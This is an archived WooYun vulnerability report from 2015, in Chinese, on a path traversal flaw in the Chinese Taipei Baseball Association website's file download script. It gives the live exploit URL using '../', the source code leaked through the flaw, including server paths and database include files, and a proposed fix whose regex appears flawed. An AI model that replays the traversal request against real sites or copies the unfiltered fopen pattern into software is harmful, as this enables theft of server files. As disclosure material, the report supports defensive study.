{"id": 26638, "wybug_id": "wooyun-2015-0128144", "wybug_title": "台湾棒球协会任意文件下载漏洞", "wybug_corp": "台湾棒球协会", "wybug_author": "路人甲", "wybug_date": "2015-07-22 15:08", "wybug_open_date": "2015-09-05 17:24", "wybug_type": "任意文件遍历/下载", "wybug_level": "高", "wybug_rank_0": "13", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件操作参数未加过滤"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-22：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-01：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-11：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-05：\t细节向公众公开  简要描述：  详细说明：  1.http://www.ctba.org.tw/download.php下载文件时发现会导向http://www.ctba.org.tw/func_file_download.php?filename=%25E6%2597%2585%25E5%25A4%2596%25E9%2581%25B8%25E6%2589%258B%25E7%25A9%25BA%25E7%2599%25BD%25E5%258D%2594%25E8%25AD%25B0%25E6%259B%25B8%25E8%258B%25B1%25E6%2596%2587%25E7%2589%2588.doc\n\n2.随意测试程序，没中http://www.ctba.org.tw/func_file_download.php?filename=func_file_download.php3.往上一层测试，中了http://www.ctba.org.tw/func_file_download.php?filename=../func_file_download.php\n\n4.接下来就是打包外带XD   漏洞证明：  func_file_download.php的程序代码如下\n<?php// 去$base_dir = '/home/ctba';$base_inc_dir = '/home/ctba/include';include(\"/home/ctba/include/web_basic_data.php\");include(\"/home/ctba/include/mysql/db_connect.php\");include(\"/home/ctba/include/functions/functions.inc.php\");include(\"/home/ctba/include/properties.inc.php\");$path = 'file';//新闻内之下载文件if( $file>=1 && $file<=20){    $path = 'download';\t$q  = \"SELECT * FROM ctba.articles_data \";\t$q .= \"WHERE Articles_Auto_Serial = '$id' and articles_status > 0 \";\t$db->query($q);\t$db->next_record();\tswitch($file) {\t\tcase 1: $filename = $db->f(\"Articles_Word_File\"); break;\t\tcase 2: $filename = $db->f(\"Articles_Word_File2\"); break;\t\tcase 3: $filename = $db->f(\"Articles_Word_File3\"); break;\t\tcase 4: $filename = $db->f(\"Articles_Word_File4\"); break;\t\tcase 5: $filename = $db->f(\"Articles_Word_File5\"); break;\t\tcase 6: $filename = $db->f(\"Articles_Word_File6\"); break;\t\tcase 7: $filename = $db->f(\"Articles_Word_File7\"); break;\t\tcase 8: $filename = $db->f(\"Articles_Word_File8\"); break;\t\tcase 9: $filename = $db->f(\"Articles_Word_File9\"); break;\t\tcase 10: $filename = $db->f(\"Articles_Word_File10\"); break;\t\tcase 11: $filename = $db->f(\"Articles_Word_File11\"); break;\t\tcase 12: $filename = $db->f(\"Articles_Word_File12\"); break;\t\tcase 13: $filename = $db->f(\"Articles_Word_File13\"); break;\t\tcase 14: $filename = $db->f(\"Articles_Word_File14\"); break;\t\tcase 15: $filename = $db->f(\"Articles_Word_File15\"); break;\t\tcase 16: $filename = $db->f(\"Articles_Word_File16\"); break;\t\tcase 17: $filename = $db->f(\"Articles_Word_File17\"); break;\t\tcase 18: $filename = $db->f(\"Articles_Word_File18\"); break;\t\tcase 19: $filename = $db->f(\"Articles_Word_File19\"); break;\t\tcase 20: $filename = $db->f(\"Articles_Word_File20\"); break;\t\tdefault: $filename = $db->f(\"Articles_Word_File\"); break;\t}}$real_filename = urldecode($filename) ;$browser_agent = 'ie' ;$real_filename = ($browser_agent == 'ie' || $browser_agent == 'opera')? mb_convert_encoding($real_filename,\"BIG5\",\"UTF-8\"):$real_filename; /*header('Pragma: public');header('Expires: 0');header('Last-Modified: ' . gmdate('D, d M Y H:i ') . ' GMT');header('Cache-Control: must-revalidate, post-check=0, pre-check=0');header('Cache-Control: private', false);header('Content-Type: application/octet-stream');header('Content-Disposition: attachment; filename=\"' . $real_filename. '\";');header('Content-Transfer-Encoding: binary');*/header(\"Content-Disposition: attachment; filename=\".$real_filename.\"\\n\");header(\"Content-type: application/x-download\"); header(\"Content-Description: PHP5 Generated Data\");$fp=fopen($base_dir.$path.'/'.$filename, \"r\");  fpassthru($fp);  ?>\n   修复方案：  func_file_download.php第66行有问题\n$fp=fopen($base_dir.$path.'/'.$filename, \"r\");\n所以要在65行检查$filename变量应拒绝../ ..\\ 路径遍历\nIf(strstr($filename, '..')) return;\n接者应正规化检验是否符合 文件.doc\nIf(!(preg_match(' /.doc$/',$filename))) return;\n   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-07-22 17:23 厂商回复： 感謝通知！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}